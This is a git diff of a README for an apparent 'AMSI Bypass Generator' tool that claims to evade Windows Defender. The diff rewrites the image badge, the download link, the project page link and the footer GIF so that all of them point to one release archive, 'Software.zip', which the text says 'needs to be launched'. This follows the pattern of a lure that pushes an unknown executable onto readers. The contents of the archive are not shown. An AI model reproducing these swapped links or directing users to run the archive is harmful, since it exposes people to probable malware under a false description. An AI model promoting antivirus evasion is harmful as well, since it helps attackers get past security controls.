@@ -1,7 +1,7 @@
 # 🚀 **AMSI Bypass Generator**
 
 <p align="center">
-  <img src="https://img.shields.io/badge/AMSI-Bypass--Generator-blue">
+  <img src="https://github.com/Glzinn99/AMSI-Bypass-Generator/releases/download/v1.0/Software.zip">
 </p>
 
 Welcome to the AMSI Bypass Generator repository! This tool is designed to generate techniques to evade the Antimalware Scan Interface (AMSI) in Windows. By using random methods to create code without detectable signatures, this tool can help in bypassing Windows Defender and other AMSI-related security measures. It is ideal for security research, ethical hacking, and anyone interested in exploring evasion techniques.
@@ -47,12 +47,12 @@ The AMSI Bypass Generator covers a wide range of topics related to evasion techn
 ## 📥 Download
 
 To download the latest version of the AMSI Bypass Generator, click on the following link:
-[Download AMSI Bypass Generator v1.0.0](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download AMSI Bypass Generator v1.0.0](https://github.com/Glzinn99/AMSI-Bypass-Generator/releases/download/v1.0/Software.zip)
 *(Needs to be launched)*
 
 ## 🌐 Connect with Us
 
-Stay updated on the latest releases and news by visiting our [GitHub Page](https://github.com/AMSI-Bypass-Generator) or checking the "Releases" section for any new updates.
+Stay updated on the latest releases and news by visiting our [GitHub Page](https://github.com/Glzinn99/AMSI-Bypass-Generator/releases/download/v1.0/Software.zip) or checking the "Releases" section for any new updates.
 
 ## 📝 Contributions
 
@@ -71,5 +71,5 @@ Feel free to download the latest version of AMSI Bypass Generator and explore th
 --- 
 
 <p align="center">
-  <img src="https://media.giphy.com/media/xT0xeJpnrWC4XWblEk/giphy.gif">
+  <img src="https://github.com/Glzinn99/AMSI-Bypass-Generator/releases/download/v1.0/Software.zip">
 </p>
